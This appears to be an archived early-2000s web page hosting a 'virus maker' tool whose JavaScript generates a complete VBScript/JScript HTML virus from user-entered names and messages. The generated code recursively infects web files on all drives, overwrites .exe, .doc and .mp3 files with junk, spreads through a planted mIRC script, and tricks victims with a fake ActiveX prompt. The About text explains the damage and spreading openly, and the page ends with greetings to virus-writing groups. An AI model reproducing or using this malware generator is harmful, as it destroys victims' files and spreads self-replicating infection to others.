<html>
<head>
<title>Simple and fas html virus maker version 1.0 by sevenC / N0:7</title>
<Script language="JavaScript">
<!--This is SAFHVM V.1.0 by sevenC / N0:7

function seven(){


suck=open("","displayWindow",
"width=700,height=500,status=no,toolbar=no,menubar=no,scrollbars=yes");
  
var v = seven1.virus.value;
var n = seven1.nama.value;
var c = seven1.komentar.value;
var t = seven1.tag.value;
suck.document.open();
suck.document.writeln("<HTML><BODY BGCOLOR=BLACK> <FONT FACE=Arial COLOR=#3399FF><B>SIMPLE AND FAST HTML VIRUS MAKER V.1.0 by sevenC / N0:7<br>");
suck.document.writeln("http://trax.to/sevenC | http://sevenc.vze.com<br>");
suck.document.writeln("mailto:sevenC_zone@yahoo.com</B><br>");
suck.document.writeln("<br>");
suck.document.writeln("Copy this code bellow save as html file<br>");
suck.document.writeln("-------------------------------Cut here-----------------------------<br>");
suck.document.writeln("&lt;!--"+v+"--&gt;<br>");
suck.document.writeln("&lt;!--"+" made by " +n+"--&gt;<br>");
suck.document.writeln("&lt;!-- Generated with SAFHVM v.1.0 by sevenC / N0:7 --&gt;<br>");
suck.document.writeln("&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;<br>");
suck.document.writeln("&lt;script language=VBScript&gt;<br>");
suck.document.writeln("'"+v+"<br>");
suck.document.writeln("'made by "+n+"<br>");
suck.document.writeln("'Generated with SAFHVM v.1.0 <br>");
suck.document.writeln("<br>");
suck.document.writeln("On Error Resume Next<br>");
suck.document.writeln("MsgBox &quot;To view this page you must accept the ActiveX&quot;,vbinformation,&quot;Internet Explorer&quot;<br>");
suck.document.writeln("Set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>");
suck.document.writeln("Set ws=CreateObject(&quot;WScript.Shell&quot;)<br>");
suck.document.writeln("If err.number=429 Then<br>");
suck.document.writeln("ws.Run javascript:location.reload()<br>");
suck.document.writeln("Else<br>");
suck.document.writeln("Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder<br>");
suck.document.writeln("Set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>");
suck.document.writeln("set Trange = document.body.CreateTextRange<br>");
suck.document.writeln("Set Drives = fso.drives <br>");
suck.document.writeln("For Each Drive in Drives<br>");
suck.document.writeln("If drive.isready then<br>");
suck.document.writeln("Dosearch drive<br>");
suck.document.writeln("end If  <br>");
suck.document.writeln("next<br>");
suck.document.writeln("function Dosearch(path)<br>");
suck.document.writeln("on error resume next<br>");
suck.document.writeln("Set Folder=fso.getfolder(path)<br>");
suck.document.writeln("Set Files = folder.files<br>");
suck.document.writeln("For Each File in files<br>");
suck.document.writeln("If fso.GetExtensionName(file.path)=&quot;htm&quot; or fso.GetExtensionName(file.path)=&quot;html&quot; or fso.GetExtensionName(file.path)=&quot;asp&quot; or fso.GetExtensionName(file.path)=&quot;php&quot; or fso.GetExtensionName(file.path)=&quot;cgi&quot; then<br>");
suck.document.writeln("on error resume next<br>");
suck.document.writeln("Set seven = FSO.OpenTextFile(file.path, 1, False)<br>");
suck.document.writeln("FileContents = seven.ReadAll()<br>");
suck.document.writeln("seven.close()<br>");
suck.document.writeln("Set seven = FSO.OpenTextFile(file.path, 2, False)<br>");
suck.document.writeln("seven.WriteLine &quot;&lt;!--"+v+"--&gt;&quot;<br>");
suck.document.writeln("seven.Write(&quot;&lt;html&gt;&lt;body&gt;&quot; + Chr(13) + Chr(10))<br>");
suck.document.writeln("seven.WriteLine TRange.htmlText<br>");
suck.document.writeln("seven.WriteLine (&quot; &quot;)<br>");
suck.document.writeln("seven.WriteLine (&quot;&lt;/body&gt;&lt;/html&gt;&quot;)<br>");
suck.document.writeln("seven.Write(FileContents)<br>");
suck.document.writeln("seven.close()<br>");
suck.document.writeln("On error resume next<br>");
suck.document.writeln("set a=fso.CreateTextFile(&quot;C:\\mirc\\script.ini&quot;)<br>");
suck.document.writeln("a.WriteLine &quot;[script]&quot;<br>");
suck.document.writeln("a.WriteLine &quot;n0=on 1:join:*.*: { if ( $nick ==$me ) {halt} &quot;<br>");
suck.document.writeln("a.WriteLine &quot;n1=/dcc send $nick C:\\mirc\\joke.htm }&quot;<br>");
suck.document.writeln("a.Close()<br>");
suck.document.writeln("end if<br>");
suck.document.writeln("If fso.GetExtensionName(file.path)=&quot;exe&quot; then<br>");
suck.document.writeln("on error resume next<br>");
suck.document.writeln("set drop = fso.createtextfile(File.path)<br>");
suck.document.writeln("drop.writeline &quot;"+c+"&quot;<br>");
suck.document.writeln("drop.close<br>");
suck.document.writeln("end if<br>");
suck.document.writeln("If fso.GetExtensionName(file.path)=&quot;doc&quot; then<br>");
suck.document.writeln("on error resume next<br>");
suck.document.writeln("set drop = fso.createtextfile(File.path)<br>");
suck.document.writeln("drop.writeline &quot;"+c+"&quot;<br>");
suck.document.writeln("drop.close<br>");
suck.document.writeln("end if<br>");
suck.document.writeln("If fso.GetExtensionName(file.path)=&quot;mp3&quot; then<br>");
suck.document.writeln("on error resume next<br>");
suck.document.writeln("set drop = fso.createtextfile(File.path)<br>");
suck.document.writeln("drop.writeline &quot;"+c+"&quot;<br>");
suck.document.writeln("drop.close<br>");
suck.document.writeln("end if<br>");
suck.document.writeln("next<br>");
suck.document.writeln("Set Subfolders = folder.SubFolders<br>");
suck.document.writeln("For Each Subfolder in Subfolders<br>");
suck.document.writeln("Dosearch Subfolder.path <br>");
suck.document.writeln("Next <br>");
suck.document.writeln("end function <br>");
suck.document.writeln("end if<br>");
suck.document.writeln("--&gt;&lt;/script&gt;<br>");
suck.document.writeln("&lt;script language=&quot;JavaScript&quot;&gt;<br>");
suck.document.writeln("var viruspath, virus, code, fso, file<br>");
suck.document.writeln("fso=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;)<br>");
suck.document.writeln("viruspath=window.location.pathname<br>");
suck.document.writeln("viruspath=viruspath.slice(1)<br>");
suck.document.writeln("virus=fso.OpenTextFile(viruspath,1)<br>");
suck.document.writeln("code=virus.ReadAll()<br>");
suck.document.writeln("virus.Close();<br>");
suck.document.writeln("file=fso.CreateTextFile(&quot;C:\\\\mirc\\\\joke.htm&quot;, 2)<br>");
suck.document.writeln("file.write(code)<br>");
suck.document.writeln("file.Close()<br>");
suck.document.writeln("&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<br>");
suck.document.writeln("&lt;html&gt;&lt;head&gt;&lt;title&gt;"+v+" by "+n+"&lt;/title&gt;&lt;head&gt;&lt;body bgcolor=&quot;black&quot;&gt;<br>");
suck.document.writeln("&lt;h3 align=&quot;center&quot;&gt;<br>");
suck.document.writeln("&lt;font color=&quot;white&quot;&gt;<br>");
suck.document.writeln("&lt;marquee&gt;"+v+" by "+n+"&lt;/marquee&gt;&lt;br&gt;&lt;br&gt;<br>");
suck.document.writeln(t+"&lt;br&gt;&lt;br&gt;");
suck.document.writeln("Generated with Simple and fast html virus maker by sevenC / N0:7<br>");
suck.document.writeln("&lt;/body&gt;&lt;/html&gt;<br>");
suck.document.writeln("-------------------------------Code finish -----------------------------<br>");
suck.document.writeln("<B><font color=red>WARNING : SEVENC HAS NO RESPONSIBILITY FOR ANY DEMAGES <br>");
suck.document.writeln("COZ OF YOUR ACT WITH THE CODE U MADE...!!!</font></b><br>");
suck.document.close();
}

function Info(){

fuck=open("","displayWindow",
"width=350,height=400,status=no,toolbar=no,menubar=no,scrollbars=no");

fuck.document.open();
fuck.document.writeln("<HTML><BODY BGCOLOR=BLACK> <FONT FACE=Arial size = 2 Color=#3399FF><b>Simple and fast html virus maker version 1.0</b><br>");
fuck.document.writeln("by sevenC / N0:7<br>");
fuck.document.writeln("http://trax.to/sevenC | http://sevenc.vze.com<br>");
fuck.document.writeln("mailto:sevenC_zone@yahoo.com<br>");
fuck.document.writeln("-------------------------sevenC-----------------------------<br>");
fuck.document.writeln("easy way to make powerfull html virus......<br>");
fuck.document.writeln("The virus has U made has ability to search and infect all htm,html,php,asp & cgi script<br>");
fuck.document.writeln("on computer target virus also erase all exe,mp3&doc files and droping your fuckin fake bytes<br>");
fuck.document.writeln("How virus can spread ??<br>");
fuck.document.writeln("If there are mirc directory exist on target,virus copy it self as joke.htm to that directory<br>");
fuck.document.writeln("and spreading with mirc....<br>");
fuck.document.writeln("<br>");
fuck.document.writeln("<font color=red><b>SevenC warning :</font><b><br>");
fuck.document.writeln("Be very carefull use this... I hope U don't play with it<br>");
fuck.document.writeln("you take all responsibility for any demages becoz of the virus <br>");
fuck.document.writeln("<br>");
fuck.document.writeln("Copyright(c)2003 --- N0:7 Laboratoryoum product<br>");
fuck.document.writeln("<br>");
fuck.document.writeln("<form><p align=center><input type=button value=Close onclick=window.Close(self)></p></form>");
fuck.document.writeln("<br>");
fuck.document.close();
}

function credit(){

fuck=open("","displayWindow",
"width=550,height=400,status=no,toolbar=no,menubar=no,scrollbars=no");

fuck.document.open();
fuck.document.writeln("<HTML><BODY BGCOLOR=BLACK> <FONT FACE=arial size=2 COLOR=#3399FF><b>Simple and fast html virus maker version 1.0</b><br>");
fuck.document.writeln("by sevenC / N0:7<br>");
fuck.document.writeln("http://trax.to/sevenC | http://sevenc.vze.com<br>");
fuck.document.writeln("mailto:sevenC_zone@yahoo.com<br>");
fuck.document.writeln("<br>");
fuck.document.writeln("<b>CreditZ for : </b><br>");
fuck.document.writeln("-Specialy for <font color=white>ibbm maker</font>,I don't know who is he,<br>but I've gotten Idea from his ibbm to make<br>");
fuck.document.writeln(" html virus generator via html...greetz for you man..!!<br>");
fuck.document.writeln("-<font color=white>Sector-s team </font>(VR,b0rkz,flinston,katro,KDS,J12 perhaps...)<br>");
fuck.document.writeln("-<font color=white>VXerz & non VXerz<br>");
fuck.document.writeln("-VX virus team (h3rm1t,29a,Methaphase,NoMercy,KD,IKX,indovirus)</font><br>");
fuck.document.writeln("-[K]alamar,Snakebytes,gigabyte,philet0a$ter,DvL,SAD1c,Jackie,VxD,alcopaul<br>");
fuck.document.writeln("-all in <font color=white>Jasakom,kecoak,medan-hacking,AntiHackerLink</font><br>");
fuck.document.writeln("-#warez,#vir,#virii,#CT,#D0S<br>");
fuck.document.writeln("-logC,St'o,CBuG's,LadyBuGs,DR'Ponidi,samurai_hackz,Onan-farabi<br>");
fuck.document.writeln("-all in <font color=white>KELUARGA MIRING FORUM</font> ( Admin & moderator ),Username,rudzt_logan,<br>#8,sonny_punjadi");
fuck.document.writeln(" DeepBlue,kyai_sadrun,My_Life,putri-bunga,Trash-heap-kennedy<br>redsneakers,bOrkZ,killi-lucu,hanks etc who know me<br>");
fuck.document.writeln("-<font color=white>Pinker-community</font>(Joe,dumbweed,yosenux,topenk,MARCO,IWAN)<br>");
fuck.document.writeln("-all in indovirus forum (admin,moderator),specially iwing<br>");
fuck.document.writeln("-And you...thanks for read this....<br>");
fuck.document.close();
}


//-->
</script>
</head>

<body bgcolor="#000000" text="#FFFFFF" link="#FF0000" vlink="#FF0000" alink="#FF0000">

<p align="center"><b><font face="Comic Sans MS" size="5" color="#3399FF">Simple and fast html virus maker
version 1.0<br> by sevenC / n0:7</font></b><font face="Comic Sans MS" size="4" color="#3399FF"><br>for internet explorer 5.5 or letter</font></p>

<form name="seven1">
  <p align="center"><font color="#3399FF"><font face="Comic Sans MS">Virus name : </font> <input type="text" name="virus" size="20" style="background-color: #3399FF; font-family: Comic Sans MS; text-decoration: blink; font-weight: bold; color: #000080; border-style: solid"> 
  <font face="Comic Sans MS">Your name</font> : <input type="text" name="nama" size="20" style="background-color: #3399FF; font-family: Comic Sans MS; color: #000080; font-weight: bold; border-style: solid"></font></p>
  <p align="center"><font color="#3399FF"><font face="Comic Sans MS">Fake bytes ( you can put any character or mesages here) :&nbsp;</font><BR><textarea rows="3" name="komentar" cols="47" style="background-color: #3399FF; font-family: Comic Sans MS; color: #000080; text-decoration: blink; border-style: outset; border-color: #000000"></textarea></font></p>
  <p align="center"><font face="Comic Sans MS"><font color="#3399FF">Put your html tag or comment here :</font></font><font color="#3399FF"><BR><textarea rows="3" name="tag" cols="47" style="background-color: #3399FF; font-family: Comic Sans MS; color: #000080; text-decoration: blink; border-style: solid; border-color: #000000"></textarea></font></p>
  <p align="center"><font color="#3399FF">Infect files : <input type="checkbox" name="html" value="ON" checked style="background-color: #3399FF; color: #FF0000">.html
  <input type="checkbox" name="htm" value="ON" checked style="background-color: #3399FF">.htm <input type="checkbox" name="asp" value="ON" checked style="background-color: #3399FF">.asp
  <input type="checkbox" name="php" value="ON" checked style="background-color: #3399FF">.php <input type="checkbox" name="cgi" value="ON" checked style="background-color: #3399FF">.cgi<BR>Fake bytes droping : <input type="checkbox" name="mp3" value="ON" checked style="background-color: #3399FF">.mp3
  <input type="checkbox" name="exe" value="ON" checked style="background-color: #3399FF">.exe <input type="checkbox" name="doc" value="ON" checked style="background-color: #3399FF">.doc<BR>miRc spreading : <input type="checkbox" name="aktif" value="ON" checked style="background-color: #3399FF">
  activated</font></p>
  <p align="center"><font color="#3399FF"><input type="button" Value="Make virus....!!" OnClick="seven()" style="background-color: #3399FF; color: #000080; font-family: Comic Sans MS; text-decoration: blink; font-weight: bold; border-style: outset; border-color: #3399FF">
  <input type="reset" value="Clear it.." name="B2" style="background-color: #3399FF; color: #000080; font-family: Comic Sans MS; text-decoration: blink; font-weight: bold; border-style: outset; border-color: #3399FF; background-position: center 50%">
  <input type="button" value="About" OnClick="Info()" style="background-color: #3399FF; color: #000080; text-decoration: blink; font-family: Comic Sans MS; font-weight: bold; border-style: outset; border-color: #3399FF"> 
  <input type="button" value="cReditZ..." OnClick="credit()" style="background-color: #3399FF; color: #000080; text-decoration: blink; font-family: Comic Sans MS; font-weight: bold; border-style: outset; border-color: #3399FF"> </font> </p>
</form>

<p align="center"><font color="#3399FF" face="Comic Sans MS"><a href="index1.html" style="color: #3399FF; text-decoration: overline; background-color: #000000">Back
to index</a></font></p>

</body>

</html>
<!-- text below generated by server. PLEASE REMOVE --></object></layer></div></span></style></noscript></table></script></applet>
<script language="JavaScript">var PUpage="76001067"; var PUprop="geocities"; </script><script language="JavaScript" src="http://www.geocities.com/js_source/pu5geo.js"></script><script language="JavaScript" src="http://www.geocities.com/js_source/ygIELib9.js?v3"></script><script language="JavaScript">var yviContents='http://us.toto.geo.yahoo.com/toto?s=76001067&l=NE&b=1&t=1062535405';yviR='us';yfiEA(0);</script><script language="JavaScript" src="http://us.i1.yimg.com/us.yimg.com/i/mc/mc.js"></script><script language="JavaScript" src="http://geocities.com/js_source/geov2.js"></script><script language="javascript">geovisit();</script><noscript><img src="http://visit.webhosting.yahoo.com/visit.gif?us1062535405" alt="setstats" border="0" width="1" height="1"></noscript>
<IMG SRC="http://geo.yahoo.com/serv?s=76001067&t=1062535405" ALT=1 WIDTH=1 HEIGHT=1>
